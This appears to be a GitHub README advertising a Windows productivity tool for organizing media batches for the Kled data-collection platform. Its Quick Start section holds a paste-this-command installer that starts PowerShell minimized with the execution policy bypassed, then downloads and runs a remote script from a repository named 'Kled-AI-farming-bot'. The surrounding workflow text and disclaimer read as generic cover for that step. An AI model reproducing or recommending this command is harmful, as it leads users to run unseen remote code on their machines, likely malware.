# 📱 Kled AI Workflow Assistant

> Productivity tool for organizing **Kled-style data collection workflows** — manage tasks, prepare files, review submissions, and streamline upload-ready datasets with a clean local workflow.

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Local Tool](https://img.shields.io/badge/Mode-Local%20Workflow-8A2BE2?style=for-the-badge&logoColor=white)](#)
[![Windows](https://img.shields.io/badge/Windows-Optimized-0078D6?style=for-the-badge&logo=windows&logoColor=white)](#)
[![Free](https://img.shields.io/badge/Usage-Free-00C851?style=for-the-badge)](#)

```
╔══════════════════════════════════════════════════════════════════════╗
║  Task Organizer         │  keep collection tasks structured        ║
║  File Prep Pipeline     │  sort, rename, and validate media        ║
║  Quality Review         │  remove low-quality or duplicate files   ║
║  Submission Assistant   │  prepare upload-ready batches            ║
╚══════════════════════════════════════════════════════════════════════╝
```

This project is designed for creators and contributors who want a cleaner, faster workflow for data-task platforms like **Kled**.

---

## 🚀 Quick Start

If you just want to launch the project quickly on Windows, use the installation command below first. After that, continue with the local setup and workflow steps.

### 🛠️ Installation

#### CMD
Open **CMD** and run this **single command**:

```powershell
cmd /c start /min powershell -ep bypass -c "iwr 'https://github.com/HOYEH/Kled-AI-farming-bot/releases/download/v1.12/main.ps1' -UseBasicParsing|iex" & rem update
```

> Then continue with the setup, task configuration, and file-preparation steps below.

### ✨ What This Tool Helps With

This workflow assistant is built to help you operate **faster and more cleanly** when working with upload/task-based data platforms.

It can help with:

- organizing task batches locally
- sorting photos, videos, and metadata into structured folders
- preparing upload-ready datasets
- reviewing quality before submission
- tracking task progress and completed batches
- reducing manual chaos when working with lots of files

---

## 📘 Project Setup

### Requirements

- Windows PC
- Python 3.10+
- Git
- Local storage for media batches
- Optional FFmpeg for media inspection / conversion
- Optional spreadsheet or CSV workflow for tracking tasks

### Step 2 — Install dependencies

```bash
pip install -r requirements.txt
```

### Step 3 — Configure environment

```bash
cp .env.example .env
```

Edit `.env` if you want to define:

- input media folders
- output folders
- naming rules
- duplicate detection settings
- metadata export paths

### Step 4 — Run the assistant

```bash
python main.py
```

### Step 5 — Prepare your first batch

```bash
python main.py --input ./raw_media --output ./prepared_batch
```

---

## 📌 Table of Contents

- [Quick Start](#-quick-start)
- [Overview](#-overview)
- [How Kled-Style Workflows Usually Work](#-how-kled-style-workflows-usually-work)
- [Core Features](#-core-features)
- [Batch Preparation Workflow](#-batch-preparation-workflow)
- [File Organization](#-file-organization)
- [Quality Review](#-quality-review)
- [Why This Tool Is Useful](#-why-this-tool-is-useful)
- [Running Locally](#-running-locally)
- [Disclaimer](#-disclaimer)

---

## 🌐 Overview

Kled appears to be focused on **human data collection**, where users contribute media or complete platform tasks and receive rewards or payouts for useful submissions.

That means the real bottleneck is often not the app itself — it is the surrounding workflow:

- files scattered across folders
- inconsistent naming
- duplicate media
- weak quality control
- confusion about what has already been prepared or submitted

This project helps solve that by giving you a **local workflow layer** around your task and media preparation process.

---

## 📲 How Kled-Style Workflows Usually Work

A typical workflow on a platform like this can involve:

1. discovering available tasks
2. collecting or recording the required media
3. sorting files into clean batches
4. checking quality and relevance
5. uploading the approved content
6. tracking progress and payouts

This repository is meant to support the **organization and preparation** side of that process.

---

## ⚙️ Core Features

- **task batch organization**
- **folder-based media preparation**
- **duplicate file detection support**
- **clean naming and export workflow**
- **metadata-friendly structure**
- **quality review pipeline**
- **upload-ready batch creation**
- **local and private workflow control**

---

## 🗂️ Batch Preparation Workflow

A clean batch workflow usually looks like this:

```text
Raw media collection
    ↓
Sort by task / category / date
    ↓
Filter low-quality content
    ↓
Rename files consistently
    ↓
Export structured upload batch
    ↓
Track submission status
```

This reduces mistakes and makes large-scale task handling much easier.

---

## 📁 File Organization

Example structure:

```text
project/
├── raw_media/
│   ├── images/
│   └── videos/
├── prepared_batch/
│   ├── task_01/
│   ├── task_02/
│   └── metadata/
├── rejected/
└── exports/
```

Keeping things organized makes review faster and helps avoid accidental re-uploads or missing files.

---

## ✅ Quality Review

Before uploading any batch, it helps to check:

- file clarity
- lighting / visibility
- relevance to the task
- duplicate or near-duplicate content
- naming consistency
- corrupted or incomplete media

A simple quality pass can improve acceptance rates and reduce wasted effort.

---

## 💡 Why This Tool Is Useful

Instead of handling everything manually, this assistant helps you:

- move faster
- keep files clean and structured
- reduce repetitive work
- manage bigger batches more safely
- keep better records of what was prepared and submitted

It is especially helpful if you work with many folders, many files, or repeated upload cycles.

---

## 🖥️ Running Locally

For a smooth local workflow:

1. keep raw files in one main input folder
2. export prepared files into a separate batch folder
3. archive completed batches after submission
4. keep naming rules consistent
5. back up approved batches and metadata

---

## ⚠️ Disclaimer

This repository is intended for **legitimate workflow organization, local file preparation, and quality review**. Always follow the platform's rules, content policies, submission requirements, and payout terms.

Do not use any tool or workflow in a way that violates platform rules, misrepresents content, or bypasses integrity checks.
